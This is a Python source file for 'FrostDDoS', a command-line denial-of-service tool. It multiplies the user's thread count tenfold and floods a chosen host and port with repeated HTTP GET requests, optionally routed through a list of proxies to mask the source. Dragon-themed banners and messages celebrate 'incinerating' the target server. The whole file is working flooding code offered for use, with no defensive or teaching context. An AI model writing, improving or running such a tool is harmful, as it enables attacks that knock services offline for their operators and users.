import shutil
import sys
import time
import socket
import threading
import random
from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor
import requests

# Generate a random color code
def random_color():
    return f"\033[38;2;{random.randint(0, 255)};{random.randint(0, 255)};{random.randint(0, 255)}m"

# Print text centered with random color
def print_centered(text, scale=1):
    terminal_width = shutil.get_terminal_size().columns
    scaled_width = terminal_width // scale
    for line in text.split('\n'):
        left_padding = (scaled_width - len(line)) // 2
        print(random_color() + " " * left_padding + line + "\033[0m")

# ASCII art with multiple colors
ascii_art_lines = ''' 
 _____             _   ____  ____      _____ 
|   __|___ ___ ___| |_|    \|    \ ___|   __|
|   __|  _| . |_ -|  _|  |  |  |  | . |__   |
|__|  |_| |___|___|_| |____/|____/|___|_____|

'''

text = "Coded By FrostFoe"

# Determine scaling factor based on terminal width
terminal_width = shutil.get_terminal_size().columns
scale = max(1, terminal_width // 80)

# Adding random color to ASCII art and text
for line in ascii_art_lines.split('\n'):
    print_centered(line, scale=scale)
print_centered(text, scale=scale)

# Get a random user agent
def user_agent():
    return requests.utils.default_user_agent()

# Initialize counters and locks
successful_attacks = 0
failed_attacks = 0
counter_lock = threading.Lock()

# List of dragon names
dragon_names = [
    "Smaug", "Draco", "Toothless"
]

# Function to handle attacks
def attack(host, port, preference, duration, proxy=None):
    global successful_attacks, failed_attacks
    end_time = time.time() + duration
    try:
        if proxy:
            proxy_host, proxy_port = proxy.split(':')
            with socket.create_connection((proxy_host, int(proxy_port))) as conn:
                conn.settimeout(1)
                while time.time() < end_time:
                    packet = f"GET / HTTP/1.1\nHost: {host}\n\nUser-Agent: {user_agent()}\nX-Preference: {preference}\n".encode('utf-8')
                    conn.sendall(packet)
                    with counter_lock:
                        successful_attacks += 1
                    dragon_name = random.choice(dragon_names)
                    print(f"{random_color()}{time.ctime(time.time())}\033[0m {random_color()} <--Fireball sent by {dragon_name}!🐲🔥💥 (Successful Attacks: {successful_attacks})\033[0m")
        else:
            with socket.create_connection((host, port)) as conn:
                conn.settimeout(1)
                while time.time() < end_time:
                    packet = f"GET / HTTP/1.1\nHost: {host}\n\nUser-Agent: {user_agent()}\nX-Preference: {preference}\n".encode('utf-8')
                    conn.sendall(packet)
                    with counter_lock:
                        successful_attacks += 1
                    dragon_name = random.choice(dragon_names)
                    print(f"{random_color()}{time.ctime(time.time())}\033[0m {random_color()} <--Fireball sent by {dragon_name}!🐲🔥💥 (Successful Attacks: {successful_attacks})\033[0m")
    except Exception as e:
        with counter_lock:
            failed_attacks += 1
        print(f"\033[91mError attacking {host}:{port} - {e}\033[0m")

# Main DoS function
def dos(host, port, thr, preference, duration, proxy_list=None):
    with ThreadPoolExecutor(max_workers=thr) as executor:
        if proxy_list:
            for proxy in proxy_list:
                executor.submit(attack, host, port, preference, duration, proxy)
        else:
            for _ in range(thr):
                executor.submit(attack, host, port, preference, duration)

# Print usage information
def usage():
    print('''\033[91mFrostDDoS - Coded by FrostFoe

    Usage: python3 FrostDDoS.py [-h] [-s HOST] [-p PORT] [-t TURBO] [-d DURATION] [--proxy PROXY_FILE]
    -h : You Dare Ask for Help?!
    -s : Server IP to Incinerate Under the Dragon's Wrath
    -p : Port (default 80)
    -t : Turbo (default 300)
    -d : Duration of attack in seconds (default 60)
    -pref : FrostFoe's preference (default high)
    --proxy : Optional proxy file\033[0m''')
    sys.exit()

# Parse command line arguments
def get_parameters():
    parser = ArgumentParser(description="FrostDDoS - Coded by FrostFoe")
    parser.add_argument("-s", "--server", dest="host", required=True, help="Attack to server IP -s IP")
    parser.add_argument("-p", "--port", type=int, dest="port", default=80, help="Port (default 80)")
    parser.add_argument("-t", "--turbo", type=int, dest="turbo", default=300, help="Turbo (default 300)")
    parser.add_argument("-d", "--duration", type=int, dest="duration", default=60, help="Duration of attack in seconds (default 60)")
    parser.add_argument("-pref", "--preference", dest="preference", default="high", help="FrostFoe's preference (default high)")
    parser.add_argument("--proxy", dest="proxy_file", help="Optional proxy file")
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    args = get_parameters()
    host = args.host
    port = args.port
    thr = args.turbo * 10  # Increased turbo to send 10 times more packets
    preference = args.preference
    duration = args.duration
    proxy_file = args.proxy_file

    print(f"{random_color()}", host, "Port: ", str(port), "Turbo: ", str(thr), "Duration: ", str(duration), "\033[0m")
    print(f"{random_color()}Let the Dragon's Wrath begin...🔥🐉💥🌋\033[0m")
    print(f"{random_color()}FrostFoe's preference: {preference}\033[0m")

    proxy_list = []
    if proxy_file:
        with open(proxy_file, 'r') as f:
            proxy_list = [line.strip() for line in f.readlines()]
        print(f"{random_color()}Using proxies from {proxy_file}\033[0m")
    else:
        print(f"{random_color()}No proxies specified, proceeding without proxies\033[0m")

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, int(port)))
            s.settimeout(1)
    except Exception as e:
        print(f"\033[91mCheck server IP and port: {e}\033[0m")
        sys.exit()

    # Attack start message with countdown
    for i in range(3, 0, -1):
        print(f"{random_color()}Starting attack in {i}...\033[0m")
        time.sleep(1)
    print(f"{random_color()}Attack started!\033[0m")

    # Start the DoS attack
    threading.Thread(target=dos, args=(host, port, thr, preference, duration, proxy_list if proxy_list else None)).start()

    # Wait for the attack to finish
    time.sleep(duration)

    print(f"{random_color()}Attack ended. Total successful attacks: {successful_attacks}, Total failed attacks: {failed_attacks}\033[0m")
